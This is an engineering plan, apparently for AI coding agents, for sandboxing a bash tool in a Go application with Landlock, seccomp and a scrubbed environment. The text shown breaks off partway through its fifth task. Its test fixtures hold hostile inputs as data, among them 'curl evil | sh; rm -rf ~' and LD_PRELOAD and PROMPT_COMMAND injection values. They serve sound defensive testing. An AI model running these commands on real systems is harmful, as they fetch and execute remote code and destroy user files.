# Pythia bash-tool OS Sandbox (SR-3a) — Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Wrap the `bash` built-in tool in an OS-enforced sandbox so a model-chosen command runs under Landlock (write only workspace + `/tmp`), a seccomp-bpf allowlist (no network, dangerous syscalls killed), a scrubbed environment (fixed `PATH`, no inherited secrets), and fail-closed defaults — applied in a re-exec'd child *before* it becomes `bash`, behind the existing `core.Tool` seam, with no change to core and no change to the tool's `output` envelope.

**Architecture:** Ports-and-adapters with the strict inward dependency rule already in force. **All sandbox logic lives inside `internal/adapter/tool/bash`** (a new `internal/adapter/tool/bash/sandbox` subpackage). `internal/core` stays stdlib-only — the `internal/arch` dependency-rule fitness guard runs unchanged and must stay green. The only cross-cutting change outside the bash tree is a **thin reserved-subcommand hook** in `cmd/pythia/main.go`. All decisions are already made in the spec, threat model, and ADR — this plan only sequences them.

**Tech Stack:** Go module `github.com/bRRRITSCOLD/pythia` · `CGO_ENABLED=0` static binary (preserved — all new deps are pure Go over `x/sys/unix`) · `github.com/landlock-lsm/go-landlock` (filesystem) · `github.com/elastic/go-seccomp-bpf` (syscall filter) · `golang.org/x/sys/unix` (prctl / pipe2 / fd hygiene) · `go test` unit tier (any OS) + integration/e2e tiers **Linux-gated** via `//go:build linux` build tags (the sandbox is Linux-only; non-Linux fails closed).

**Source-of-truth docs (bind exactly, do not re-decide):**
- Spec: `docs/superpowers/specs/bash-sandbox.md`
- Threat model (STRIDE, per-control bypass analysis, SR-3a.1–.14 + H1–H3): `docs/security/bash-sandbox-threat-model.md`
- ADR (mechanism + re-exec pattern): `docs/adr/0005-bash-tool-os-sandbox.md`
- First-slice plan / house style: `docs/superpowers/plans/first-slice.md`

## Global Constraints

Every task's requirements implicitly include this section.

- **Module path:** `github.com/bRRRITSCOLD/pythia`, Go 1.22+.
- **Dependency rule (load-bearing invariant):** dependencies point inward. `internal/core` imports **only the Go standard library**. The sandbox subpackage lives under `internal/adapter/tool/bash` and may import `x/sys/unix`, `go-landlock`, and `go-seccomp-bpf`; the bash tool imports the sandbox subpackage. **No task may make `internal/core` import an adapter or a third-party runtime lib** — the `internal/arch` guard (`make arch-test`, run with `-count=1`) fails loudly on any regression and must stay green in every PR.
- **CGO-free (invariant):** `CGO_ENABLED=0 go build ./...` must succeed and produce one static binary. All three new deps are pure Go — `libseccomp` (CGO) is explicitly rejected (ADR-0005 §1). `make check-cgo` must pass in every PR that touches `go.mod`.
- **Build-tag split (invariant):** the real controls live in `*_linux.go` files (`//go:build linux`); a `sandbox_other.go` (`//go:build !linux`) stub **refuses** (returns `ErrUnsupported`). `GOOS=windows go build ./...` and `GOOS=linux go build ./...` must both compile at every task boundary. Platform-agnostic pieces (Policy type, wire framing, env-scrub allowlist) carry **no** build tag and are unit-tested on any OS.
- **Fail-closed is the default posture:** if the sandbox cannot be fully established (missing Landlock/seccomp, kernel < 5.13 / Landlock ABI < 2, non-Linux, or any setup error in the child before `execve`), `Invoke` returns an **error envelope** and the command **does not run**. The single documented override is `PYTHIA_BASH_SANDBOX=off` (parent env only, read via `internal/config`) — nothing in the model's tool args can flip it (SR-5 preserved).
- **Test naming (invariant):** `Subject_Scenario_Expectation`, per `principles-tdd`. Tiers: unit (any OS) / integration + e2e (Linux-gated, `//go:build linux`, and `integration` where the project convention uses it). Integration/e2e tests fail loud — no silent skips — except that on a kernel lacking Landlock ABI ≥ 2 the fail-closed path is what is asserted (not a skip).
- **Frozen `output` envelope:** stdout/stderr/exit-code/timeout/truncation semantics are unchanged. The parent still wires the bounded `limitedBuffer`s and the context timeout onto the child. The `{"ok"|"error"}` `toolkit` envelope convention is unchanged.
- **Every must-fix SR (SR-3a.1–.14) is closed by exactly-named task(s) and proven by named test(s)** — see the coverage matrix in Self-Review. Hardening SRs (H1–H3) are documented as deferred, not built (YAGNI, per spec §Out of scope).
- **TDD:** red → green → refactor per task. One PR per task; small and revertible.

## Wave / Dependency Table

Each task is one PR. `blockedBy` lists the tasks that must merge first. Tasks in the same wave with disjoint files are **parallel-safe**.

| # | Task | Wave | blockedBy | Files (package) | Parallel-safe with | Sec-review |
|---|------|------|-----------|-----------------|--------------------|-----------|
| T1 | Config: `PYTHIA_BASH_SANDBOX` mode + relocate DB out of writable scope | 0 | — | `internal/config/config.go`, `config_test.go` | T2 | — |
| T2 | Sandbox pkg skeleton + deps + `Policy` + fail-closed non-Linux stub | 0 | — | `internal/adapter/tool/bash/sandbox/*` (new pkg), `go.mod`, `go.sum` | T1 | — |
| T3 | Length-prefixed wire framing (policy + command) | 1 | T2 | `sandbox/wire.go`, `wire_test.go` | T4 | — |
| T4 | Env scrub: allowlist + fixed `PATH` + absolute `/bin/bash` | 1 | T2 | `sandbox/env.go`, `env_test.go` | T3 | — |
| T5 | Re-exec spine: `/proc/self/exe` + `__bash-sandbox` hook + pipe + fd hygiene + `NO_NEW_PRIVS` (no-op LSM child) | 2 | T3, T4 | `sandbox/sandbox_linux.go`, `child_linux.go`, `landlock_linux.go` + `seccomp_linux.go` (no-op stubs), `cmd/pythia/main.go`, `*_test.go` | — (spine) | **YES — re-exec integrity** |
| T6 | Landlock layer: strict ABI ≥ 2, fail-closed, write-scope workspace + `/tmp` (REFER) | 3 | T5 | `sandbox/landlock_linux.go`, `landlock_linux_test.go` | T7 | **YES — LSM policy** |
| T7 | seccomp layer: allowlist/default-deny, arch-validated, all-family socket + io_uring + memory-poke + lethal-set KILL, TSYNC | 3 | T5 | `sandbox/seccomp_linux.go`, `seccomp_linux_test.go` | T6 | **YES — LSM policy** |
| T8 | Wire sandbox into `bashTool.Invoke` + fail-closed + one-time unsandboxed log | 4 | T1, T6, T7 | `internal/adapter/tool/bash/bash.go`, `bash_test.go`, `cmd/pythia/main.go` | — | — |
| T9 | Bypass-probe integration/e2e suite (through `Invoke` + registry) | 5 | T8 | `sandbox/bypass_linux_test.go`, `bash/sandbox_integration_linux_test.go` | T10 | — |
| T10 | Docs: README + `PYTHIA_BASH_SANDBOX` + residual-risk (stdout egress) + deferred H1–H3 | 5 | T8 | `README.md`, `docs/security/bash-sandbox-residual-risk.md`, pkg docs | T9 | — |

**File-contention notes:**
- **`go.mod`/`go.sum`** is touched only by **T2** (all three deps added at once, anchored by the linux skeleton file so `go mod tidy` keeps them under the linux tag). No later task runs `go get`, so no `go.mod` contention across waves.
- **`cmd/pythia/main.go`** is touched by exactly two tasks — **T5** (adds the reserved-subcommand hook) and **T8** (passes the sandbox mode into `bash.New`). They are in different waves (2 vs 4) and never run concurrently, so no conflict.
- **`internal/adapter/tool/bash/bash.go`** is touched only by **T8**. The pre-existing `bash_test.go` unit tests stay green throughout (T8 keeps the legacy direct-exec path as the `off` branch).
- **`child_linux.go`** is written once in **T5** with the *full* apply sequence calling `applyLandlock(policy)` and `applySeccomp()` as **no-op stubs defined in their own files**. T6 and T7 then fill in only their own file (`landlock_linux.go` / `seccomp_linux.go`) and never touch `child_linux.go` — this is the seam that makes the two LSM layers **genuinely parallel-safe** (file-disjoint).
- **seccomp is one atomic task (T7), not split.** A half-installed filter (arch validation without socket/io_uring denial) is a *scary intermediate state* — network would be open until the second half lands. Landing the complete filter in one reviewable PR keeps the tool secure-by-construction; the security-architect reviews one coherent filter, not two halves.

**Tasks requiring security-architect review (not just staff-engineer):** **T5** (re-exec integrity, fd hygiene, out-of-band framing, `NO_NEW_PRIVS`), **T6** (Landlock policy: write scope, ABI floor, fail-closed), **T7** (seccomp policy: the allowlist, arch validation, socket/io_uring/lethal-set actions). These three are the entire security perimeter (threat model §1.1) — a subtle error in any is a full bypass. The security-architect reviews the *built* control against the threat model's SR probes; it does **not** re-author this plan.

**Cross-cutting decisions locked by this plan (see the tasks for detail):**
1. **Package layout (frozen, T2):** `internal/adapter/tool/bash/sandbox` with `policy.go` (agnostic), `wire.go` (agnostic), `env.go` (agnostic), `sandbox_linux.go` + `child_linux.go` + `landlock_linux.go` + `seccomp_linux.go` (real), `sandbox_other.go` (stub). Exported surface: `Policy`, `var ErrUnsupported`, `func Run(ctx, Policy, command string, stdout, stderr io.Writer) (exitCode int, err error)`, `func RunChild() int` (the re-exec child entrypoint).
2. **Reserved subcommand (frozen, T5):** `__bash-sandbox`. `main` detects it as `os.Args[1]` **before** `config.Load` / TUI, calls `sandbox.RunChild()`, and `os.Exit`s — never returning to the TUI path. The command bytes are **never** an argv token.
3. **Out-of-band channel (frozen, T3/T5):** a `pipe2(O_CLOEXEC)` passed as the child's `ExtraFiles[0]` (fd 3). Framing is **length-prefixed** `{u32 len(root)}{root}{u32 len(cmd)}{cmd}` (big-endian), trusted root first. Read to completion, then the fd is closed **before** `execve`. Never argv, never a shell-visible env token.
4. **Status/error pipe (frozen, T5):** a second `O_CLOEXEC` pipe. The child writes an error message to it on **any** setup failure and exits non-zero; on success it writes nothing and the pipe auto-closes at `execve`. The parent reads it to EOF: **bytes present ⇒ fail-closed** (`ErrUnsupported`, command did not run); **empty ⇒ sandbox established**, the child's exit code is the command's. This is how the parent distinguishes "sandbox failed" from "command exited non-zero."
5. **Child apply sequence (frozen, T5):** `runtime.LockOSThread` (no unlock — the thread is consumed by `execve`) → read frame → close frame fd → `prctl(PR_SET_NO_NEW_PRIVS)` → build scrubbed env → `applyLandlock(policy)` → `applySeccomp()` (TSYNC, last step) → `syscall.Exec("/bin/bash", ["bash","-c",cmd], scrubbedEnv)`. The child has **no off-branch** — it applies the sandbox unconditionally (SR-3a.11); the on/off decision lives only in the parent (T8).
6. **Fixed constants (frozen, T4):** `PATH=/usr/bin:/bin`, bash path `/bin/bash`, env allowlist `{PATH(fixed), HOME, TERM, LANG}`. `PATH`'s value is the constant, **never** inherited.
7. **Policy (frozen, T2):** `Policy{WorkspaceRoot string; TmpDir string}` — the two write-allowed roots. Built by the bash tool from `workDir` + `/tmp` at `Invoke` time; nothing in the model's args can widen it (SR-5).
8. **seccomp actions (frozen, T7, per ADR §4 / threat model §3.1):** allowlisted → `ALLOW`; unknown tail → `ERRNO(ENOSYS)`; sockets → `ERRNO(EACCES/EAFNOSUPPORT)`; lethal set + foreign-arch/x32 → `KILL_PROCESS`.
9. **DB relocation (frozen, T1):** the session DB default moves **outside** the default workspace (write scope), and `/proc/self/exe` re-exec keeps the binary tamper-irrelevant even if it sits on disk in scope (SR-3a.13).

---

## Task 1: Config — `PYTHIA_BASH_SANDBOX` mode + relocate DB out of writable scope

**Wave:** 0 · **blockedBy:** — · **PR:** small. **Parallel-safe with T2.**

Two config changes, both parent-side and independent of the sandbox package. (a) Add the `PYTHIA_BASH_SANDBOX` escape-hatch mode (`on` default / `off`) read once at startup — this is the *only* way to disable the sandbox and it lives purely in the parent env, so nothing in a tool arg can flip it (SR-3a.11, SR-5). (b) Relocate the default session-DB path **outside** the default workspace root, because with the old default (`./pythia.db`, workspace = cwd) the DB sits inside the Landlock write scope and a sandboxed command could `rm`/tamper it (SR-3a.13, threat model §2.2).

**Files:**
- Modify: `internal/config/config.go`
- Modify: `internal/config/config_test.go`

**Interfaces:**
- Adds to `Config`: `BashSandbox BashSandboxMode` (a small local `string`-backed enum: `SandboxOn` / `SandboxOff`).
- Env: `PYTHIA_BASH_SANDBOX` — unset/`on`/anything-but-off ⇒ `SandboxOn`; `off` ⇒ `SandboxOff` (fail-safe: only the exact token `off` disables).
- Changes `defaultDBPath` from `./pythia.db` to a state dir outside cwd: `$XDG_STATE_HOME/pythia/pythia.db`, falling back to `$HOME/.local/state/pythia/pythia.db` (created if absent). When `PYTHIA_DB_PATH` is set explicitly it is honored verbatim (operator override).

- [ ] **Step 1: Write the failing mode-parse tests**

```go
func TestLoad_BashSandboxUnset_DefaultsOn(t *testing.T) {
	t.Setenv("PYTHIA_WORKSPACE_ROOT", t.TempDir())
	cfg, err := Load()
	if err != nil { t.Fatal(err) }
	if cfg.BashSandbox != SandboxOn { t.Errorf("BashSandbox=%q, want on-by-default", cfg.BashSandbox) }
}
func TestLoad_BashSandboxOff_ParsesOff(t *testing.T) {
	t.Setenv("PYTHIA_WORKSPACE_ROOT", t.TempDir())
	t.Setenv("PYTHIA_BASH_SANDBOX", "off")
	cfg, _ := Load()
	if cfg.BashSandbox != SandboxOff { t.Errorf("want SandboxOff, got %q", cfg.BashSandbox) }
}
func TestLoad_BashSandboxGarbage_FailsClosedToOn(t *testing.T) {
	t.Setenv("PYTHIA_WORKSPACE_ROOT", t.TempDir())
	t.Setenv("PYTHIA_BASH_SANDBOX", "disabled") // not the exact token "off"
	cfg, _ := Load()
	if cfg.BashSandbox != SandboxOn { t.Errorf("only the exact token off disables; got %q", cfg.BashSandbox) }
}
```

- [ ] **Step 2: Write the failing DB-relocation test**

```go
func TestLoad_DefaultDBPath_IsOutsideWorkspace(t *testing.T) {
	ws := t.TempDir()
	t.Setenv("PYTHIA_WORKSPACE_ROOT", ws)
	// no PYTHIA_DB_PATH set ⇒ default must resolve outside ws (write scope)
	cfg, err := Load()
	if err != nil { t.Fatal(err) }
	rel, _ := filepath.Rel(ws, cfg.DBPath)
	if rel != "" && !strings.HasPrefix(rel, "..") {
		t.Errorf("default DBPath %q is inside workspace %q — inside the sandbox write scope (SR-3a.13)", cfg.DBPath, ws)
	}
}
func TestLoad_ExplicitDBPath_HonoredVerbatim(t *testing.T) {
	t.Setenv("PYTHIA_WORKSPACE_ROOT", t.TempDir())
	t.Setenv("PYTHIA_DB_PATH", "/custom/pythia.db")
	cfg, _ := Load()
	if cfg.DBPath != "/custom/pythia.db" { t.Errorf("operator override lost: %q", cfg.DBPath) }
}
```

- [ ] **Step 3: Implement** — add the `BashSandboxMode` type + `parseBashSandbox` helper; add a `defaultDBPath()` func that computes the XDG/HOME state path (creating the parent dir) and is used only when `PYTHIA_DB_PATH` is unset. Keep `WorkspaceRoot` canonicalization unchanged.

- [ ] **Step 4: Run — expect GREEN**, including the existing config tests (defaults/negative). Run `make arch-test` (config is a leaf pkg — must stay clean). Commit.

```bash
git add internal/config
git commit -m "feat(config): PYTHIA_BASH_SANDBOX mode + relocate default DB outside workspace"
```

**Acceptance criteria:**
- `BashSandbox` defaults to `SandboxOn`; only the exact token `off` yields `SandboxOff` (garbage fails safe to on).
- Default `DBPath` resolves outside the workspace write scope; an explicit `PYTHIA_DB_PATH` is honored verbatim.
- All pre-existing config tests still pass; `internal/config` still imports only stdlib + validator.

**Test list:**
- `TestLoad_BashSandboxUnset_DefaultsOn`, `TestLoad_BashSandboxOff_ParsesOff`, `TestLoad_BashSandboxGarbage_FailsClosedToOn` (unit — SR-3a.11).
- `TestLoad_DefaultDBPath_IsOutsideWorkspace`, `TestLoad_ExplicitDBPath_HonoredVerbatim` (unit — SR-3a.13).

**Closes:** SR-3a.11 (config/parent-env side of the hatch), SR-3a.13 (DB-relocation side).

---

## Task 2: Sandbox package skeleton + deps + `Policy` + fail-closed non-Linux stub

**Wave:** 0 · **blockedBy:** — · **PR:** small. **Parallel-safe with T1.**

Stand up the `internal/adapter/tool/bash/sandbox` package: add the three pure-Go deps, freeze the exported surface (`Policy`, `ErrUnsupported`, `Run`, `RunChild`), and land the **build-tag split** with a non-Linux stub that **refuses** (fail-closed). At this stage the Linux `Run`/`RunChild` are documented skeletons that the spine (T5) fills; the value of this task is the frozen API + the proof that both `GOOS` targets compile and that the non-Linux path returns `ErrUnsupported`. The linux skeleton file imports all three deps (minimally) so `go mod tidy` keeps them under the linux tag.

**Files:**
- Create: `internal/adapter/tool/bash/sandbox/doc.go` (package doc)
- Create: `internal/adapter/tool/bash/sandbox/policy.go` (agnostic — `Policy`, `ErrUnsupported`, exported func signatures with a shared agnostic wrapper)
- Create: `internal/adapter/tool/bash/sandbox/sandbox_linux.go` (`//go:build linux` — skeleton `Run`/`RunChild`; imports `x/sys/unix`, `go-landlock`, `go-seccomp-bpf` as anchors)
- Create: `internal/adapter/tool/bash/sandbox/sandbox_other.go` (`//go:build !linux` — `Run`/`RunChild` return/exit `ErrUnsupported`)
- Create: `internal/adapter/tool/bash/sandbox/policy_test.go` (agnostic unit test)
- Create: `internal/adapter/tool/bash/sandbox/sandbox_other_test.go` (`//go:build !linux`)
- Modify: `go.mod`, `go.sum`

**Interfaces:**
- `type Policy struct { WorkspaceRoot string; TmpDir string }` (agnostic).
- `var ErrUnsupported = errors.New("bash sandbox unsupported on this platform/kernel")` (agnostic).
- `func Run(ctx context.Context, p Policy, command string, stdout, stderr io.Writer) (exitCode int, err error)` — linux real (skeleton in T2, filled T5); non-linux returns `(-1, ErrUnsupported)`.
- `func RunChild() int` — the re-exec child entrypoint; linux real (T5); non-linux writes `ErrUnsupported` to stderr and returns a non-zero code.

- [ ] **Step 1: Add deps** — `go get github.com/landlock-lsm/go-landlock github.com/elastic/go-seccomp-bpf golang.org/x/sys/unix`.

- [ ] **Step 2: Write `policy.go` + `doc.go`** — the agnostic `Policy` type, `ErrUnsupported`, and doc comments. No build tag.

- [ ] **Step 3: Write the stub + skeleton** — `sandbox_other.go` (`!linux`) returns `ErrUnsupported` from both entrypoints; `sandbox_linux.go` (`linux`) declares the real signatures with a `// TODO(T5)` body that (for now) also returns `ErrUnsupported` so nothing runs unsandboxed prematurely, and imports the three deps behind `var _ =` anchors so `go mod tidy` retains them.

- [ ] **Step 4: Write the compile/behaviour tests**

```go
// policy_test.go (agnostic)
func TestPolicy_ZeroValue_HasEmptyRoots(t *testing.T) {
	var p Policy
	if p.WorkspaceRoot != "" || p.TmpDir != "" { t.Fatal("Policy zero value must be empty") }
}

// sandbox_other_test.go (//go:build !linux)
func TestRun_NonLinux_FailsClosedWithErrUnsupported(t *testing.T) {
	_, err := Run(context.Background(), Policy{}, "echo hi", io.Discard, io.Discard)
	if !errors.Is(err, ErrUnsupported) { t.Fatalf("non-Linux must fail closed, got %v", err) }
}
```

- [ ] **Step 5: Prove both GOOS compile** — `GOOS=linux go build ./... && GOOS=windows go build ./...`; `CGO_ENABLED=0 go build ./...`; `make arch-test` (core untouched — must stay green). Run `make check-cgo`.

- [ ] **Step 6: Commit**

```bash
git add internal/adapter/tool/bash/sandbox go.mod go.sum
git commit -m "feat(bash/sandbox): package skeleton, Policy, deps, fail-closed non-Linux stub"
```

**Acceptance criteria:**
- The three deps are in `go.mod`; `CGO_ENABLED=0 go build ./...` still produces a static binary (all pure Go).
- Both `GOOS=linux` and `GOOS=windows` compile; the non-Linux path returns `ErrUnsupported` (fail-closed).
- The exported surface (`Policy`, `ErrUnsupported`, `Run`, `RunChild`) is frozen; `internal/core` still stdlib-only (`make arch-test` green).

**Test list:**
- `TestPolicy_ZeroValue_HasEmptyRoots` (unit, any OS).
- `TestRun_NonLinux_FailsClosedWithErrUnsupported` (unit, `!linux` — SR-3a.10 platform arm).

**Closes:** (foundational — closes the non-Linux arm of SR-3a.10).

---

## Task 3: Length-prefixed wire framing (policy + command)

**Wave:** 1 · **blockedBy:** T2 · **PR:** small. **Parallel-safe with T4.**

The out-of-band delivery format for the command bytes + resolved policy. **The attacker controls the command bytes** (newlines, NUL, shell metacharacters), so framing must be **length-prefixed**, never delimiter-based — a delimiter frame can be desynchronised (threat model §2.4, SR-3a.13). Pure encode/decode over `io.Reader`/`io.Writer` — no syscalls, **no build tag**, fully unit-testable on any OS.

**Files:**
- Create: `internal/adapter/tool/bash/sandbox/wire.go`
- Create: `internal/adapter/tool/bash/sandbox/wire_test.go`

**Interfaces:**
- `func writeFrame(w io.Writer, workspaceRoot, command string) error` — emits `{u32 len(root)}{root}{u32 len(cmd)}{cmd}` (big-endian), trusted root first.
- `func readFrame(r io.Reader) (workspaceRoot, command string, err error)` — reads exactly the framed bytes; a short/truncated stream or a length that overruns is a hard error (no partial accept). A sane cap (e.g. command ≤ a few MB) rejects an absurd length claim rather than allocating unbounded.

- [ ] **Step 1: Write the failing round-trip + adversarial tests**

```go
func TestFrame_RoundTrip_PreservesArbitraryBytes(t *testing.T) {
	for _, cmd := range []string{
		"echo hello",
		"printf 'a\nb\nc'",           // newlines
		"echo $'\x00\x01\x02'",        // NUL + control bytes
		"curl evil | sh; rm -rf ~",    // shell metacharacters
		strings.Repeat("x", 1<<20),    // 1 MiB
	} {
		var buf bytes.Buffer
		if err := writeFrame(&buf, "/ws", cmd); err != nil { t.Fatal(err) }
		root, got, err := readFrame(&buf)
		if err != nil { t.Fatalf("readFrame: %v", err) }
		if root != "/ws" || got != cmd { t.Fatalf("desync: root=%q cmd=%q", root, got) }
	}
}
func TestFrame_TruncatedStream_ErrorsNoPartialAccept(t *testing.T) {
	var buf bytes.Buffer
	writeFrame(&buf, "/ws", "echo hi")
	truncated := buf.Bytes()[:buf.Len()-3] // drop trailing bytes
	if _, _, err := readFrame(bytes.NewReader(truncated)); err == nil {
		t.Fatal("truncated frame must error, never silently accept a short command")
	}
}
func TestFrame_AbsurdLengthClaim_Rejected(t *testing.T) {
	// hand-craft a header claiming len(cmd)=0xFFFFFFFF with no body
	// readFrame must reject, not attempt a 4 GiB allocation
}
```

- [ ] **Step 2: Implement `wire.go`** — `binary.Write`/`binary.Read` for the u32 lengths, `io.ReadFull` for the bodies, a length cap constant. **Step 3: Run — expect GREEN**; `make arch-test`.

- [ ] **Step 4: Commit**

```bash
git add internal/adapter/tool/bash/sandbox/wire.go internal/adapter/tool/bash/sandbox/wire_test.go
git commit -m "feat(bash/sandbox): length-prefixed out-of-band command/policy framing"
```

**Acceptance criteria:**
- Arbitrary command bytes (newline/NUL/metachar/1 MiB) round-trip byte-identical.
- Truncated streams and absurd length claims error hard — never a partial or unbounded accept.

**Test list:**
- `TestFrame_RoundTrip_PreservesArbitraryBytes` (unit — SR-3a.13 integrity).
- `TestFrame_TruncatedStream_ErrorsNoPartialAccept` (unit, adversarial — SR-3a.13).
- `TestFrame_AbsurdLengthClaim_Rejected` (unit, adversarial).

**Closes:** (framing half of SR-3a.13; completed by T5's re-exec).

---

## Task 4: Env scrub — allowlist + fixed `PATH` + absolute `/bin/bash`

**Wave:** 1 · **blockedBy:** T2 · **PR:** small. **Parallel-safe with T3.**

The environment the child hands to bash: an **allowlist** of exactly `{PATH, HOME, TERM, LANG}`, with `PATH` set to a **fixed constant** (`/usr/bin:/bin`) — never inherited, because a prior command could have planted a fake `bash`/`curl` in a writable PATH dir (threat model §2.5, SR-3a.12). All the dangerous injectors (`LD_PRELOAD`, `LD_LIBRARY_PATH`, `BASH_ENV`, `ENV`, `IFS`, `SHELLOPTS`, `PROMPT_COMMAND`, `PYTHIA_BASH_SANDBOX`) are dropped by construction. Pure function, **no build tag**, unit-testable on any OS.

**Files:**
- Create: `internal/adapter/tool/bash/sandbox/env.go`
- Create: `internal/adapter/tool/bash/sandbox/env_test.go`

**Interfaces:**
- `const fixedPATH = "/usr/bin:/bin"`, `const bashPath = "/bin/bash"`.
- `func scrubEnv(parent []string) []string` — takes the parent environment (injectable for testing), returns only the allowlisted keys, with `PATH` forced to `fixedPATH` regardless of the parent's value, and `HOME`/`TERM`/`LANG` passed through only if present.

- [ ] **Step 1: Write the failing allowlist tests**

```go
func TestScrubEnv_DropsInjectorsKeepsAllowlist(t *testing.T) {
	parent := []string{
		"PATH=/tmp/evil:/usr/bin", "HOME=/home/u", "TERM=xterm", "LANG=C",
		"LD_PRELOAD=/tmp/x.so", "BASH_ENV=/tmp/rc", "ENV=/tmp/rc", "IFS= ",
		"SHELLOPTS=xtrace", "PROMPT_COMMAND=curl evil", "SECRET=hunter2",
		"PYTHIA_BASH_SANDBOX=off",
	}
	got := scrubEnv(parent)
	m := toMap(got)
	if m["PATH"] != fixedPATH { t.Errorf("PATH=%q, want fixed %q (never inherited)", m["PATH"], fixedPATH) }
	for _, k := range []string{"HOME", "TERM", "LANG"} {
		if _, ok := m[k]; !ok { t.Errorf("allowlisted %s dropped", k) }
	}
	for _, k := range []string{"LD_PRELOAD","BASH_ENV","ENV","IFS","SHELLOPTS","PROMPT_COMMAND","SECRET","PYTHIA_BASH_SANDBOX"} {
		if _, ok := m[k]; ok { t.Errorf("dangerous/leaky var %s survived the scrub", k) }
	}
}
func TestScrubEnv_PathAlwaysFixedEvenIfParentUnset(t *testing.T) {
	got := scrubEnv([]string{"HOME=/home/u"}) // no PATH in parent
	if toMap(got)["PATH"] != fixedPATH { t.Fatal("PATH must be set to the fixed constant even when parent has none") }
}
```

- [ ] **Step 2: Implement `env.go`** — iterate the allowlist set, force `PATH`. **Step 3: Run — expect GREEN**; `make arch-test`.

- [ ] **Step 4: Commit**

```bash
git add internal/adapter/tool/bash/sandbox/env.go internal/adapter/tool/bash/sandbox/env_test.go
git commit -m "feat(bash/sandbox): env allowlist scrub with fixed PATH + absolute bash path"
```

**Acceptance criteria:**
- Only `{PATH, HOME, TERM, LANG}` survive; `PATH` is always `fixedPATH`, never the parent value.
- `LD_PRELOAD`/`BASH_ENV`/`ENV`/`IFS`/`SHELLOPTS`/`PROMPT_COMMAND`/`PYTHIA_BASH_SANDBOX` and parent secrets are absent.

**Test list:**
- `TestScrubEnv_DropsInjectorsKeepsAllowlist` (unit — SR-3a.12).
- `TestScrubEnv_PathAlwaysFixedEvenIfParentUnset` (unit — SR-3a.12).

**Closes:** SR-3a.12 (env allowlist + PATH reset + absolute bash; the PATH-plant *end-to-end* probe lands in T9).

---

## Task 5: Re-exec spine — `/proc/self/exe` + `__bash-sandbox` hook + pipe + fd hygiene + `NO_NEW_PRIVS`

**Wave:** 2 · **blockedBy:** T3, T4 · **PR:** medium. **Spine — no parallel peer.** **🔒 SECURITY-ARCHITECT REVIEW REQUIRED (re-exec integrity).**

The application mechanism, provable end-to-end **before** any LSM lands. The parent re-execs Pythia from `/proc/self/exe` with the reserved `__bash-sandbox` arg, delivers `{root, command}` over a length-prefixed `O_CLOEXEC` pipe (T3), and reads a status/error pipe to detect fail-closed. The child locks its OS thread, reads the frame, closes the frame fd, sets `NO_NEW_PRIVS`, scrubs env (T4), calls `applyLandlock`/`applySeccomp` (**no-op stubs at this task**, filled by T6/T7 in their own files), and `syscall.Exec`s `/bin/bash`. Because the LSM steps are no-ops here, the child runs bash *unsandboxed at this task* — this is safe because **nothing calls the spine yet** (`bashTool.Invoke` is wired in T8, after the LSM layers land), and the spine is exercised only by this task's direct integration tests. This ordering proves the plumbing (re-exec target, framing, fd hygiene, thread affinity) in isolation, so a later LSM bug can't be confused with a plumbing bug.

**Files:**
- Modify: `internal/adapter/tool/bash/sandbox/sandbox_linux.go` (fill `Run`: build the two `pipe2(O_CLOEXEC)` pipes, `exec.Cmd{Path: "/proc/self/exe", Args: ["pythia","__bash-sandbox"]}`, wire `stdout`/`stderr`/context timeout onto the cmd, write the frame, read the error pipe, map to exit code / `ErrUnsupported`)
- Create: `internal/adapter/tool/bash/sandbox/child_linux.go` (`RunChild`: the frozen apply sequence, calling `applyLandlock`/`applySeccomp`)
- Create: `internal/adapter/tool/bash/sandbox/landlock_linux.go` (**no-op stub** `func applyLandlock(p Policy) error { return nil }` + `// TODO(T6)`)
- Create: `internal/adapter/tool/bash/sandbox/seccomp_linux.go` (**no-op stub** `func applySeccomp() error { return nil }` + `// TODO(T7)`)
- Modify: `cmd/pythia/main.go` (thin reserved-subcommand hook)
- Create: `internal/adapter/tool/bash/sandbox/spine_linux_test.go` (`//go:build linux`)

**Interfaces:**
- The child apply sequence (decision 5) and status/error-pipe protocol (decision 4) are frozen here.
- `main.go`: at the very top of `main`, before `config.Load`, `if len(os.Args) > 1 && os.Args[1] == "__bash-sandbox" { os.Exit(sandbox.RunChild()) }`. No sandbox logic in `main` — a one-line dispatch.

- [ ] **Step 1: Write the failing end-to-end spine test** (drives `Run` directly; asserts the child re-exec produced the command's output)

```go
func TestRun_SimpleCommand_ReExecsAndReturnsOutput(t *testing.T) {
	var out, errb bytes.Buffer
	code, err := Run(context.Background(), Policy{WorkspaceRoot: t.TempDir(), TmpDir: "/tmp"},
		"echo spine-ok", &out, &errb)
	if err != nil { t.Fatalf("Run: %v", err) }
	if code != 0 || strings.TrimSpace(out.String()) != "spine-ok" {
		t.Fatalf("code=%d out=%q err=%q", code, out.String(), errb.String())
	}
}
```

- [ ] **Step 2: Write the command-integrity test** (SR-3a.13 — arbitrary bytes survive the pipe, never argv)

```go
func TestRun_CommandWithMetachars_DeliveredIntactNeverArgv(t *testing.T) {
	var out bytes.Buffer
	// newline + a subshell + quotes; if this were argv-interpolated it would misparse
	_, err := Run(context.Background(), Policy{WorkspaceRoot: t.TempDir(), TmpDir: "/tmp"},
		"printf 'a\nb'; echo \" q'q \"", &out, io.Discard)
	if err != nil { t.Fatal(err) }
	if !strings.Contains(out.String(), "a\nb") { t.Fatalf("command bytes garbled: %q", out.String()) }
}
```

- [ ] **Step 3: Write the fd-hygiene test** (SR-3a.7 — only 0/1/2 reach bash)

```go
func TestRun_FdHygiene_OnlyStdioReachesChild(t *testing.T) {
	// parent deliberately holds an extra open fd (a temp file) before Run
	f, _ := os.CreateTemp(t.TempDir(), "leak"); defer f.Close()
	var out bytes.Buffer
	_, err := Run(context.Background(), Policy{WorkspaceRoot: t.TempDir(), TmpDir: "/tmp"},
		"ls -1 /proc/self/fd", &out, io.Discard)
	if err != nil { t.Fatal(err) }
	// bash sees only 0,1,2 (ls itself may open one transient fd; assert no fd >= 3 to a real file)
	for _, fd := range parseFds(out.String()) {
		if fd >= 3 { t.Errorf("fd %d leaked into the sandbox child (SR-3a.7)", fd) }
	}
}
```

- [ ] **Step 4: Write the `NO_NEW_PRIVS` / setuid test** (SR-3a.6 — setuid gains nothing; `NO_NEW_PRIVS` is set even before the LSM layers)

```go
func TestRun_NoNewPrivs_SetuidBinaryGainsNothing(t *testing.T) {
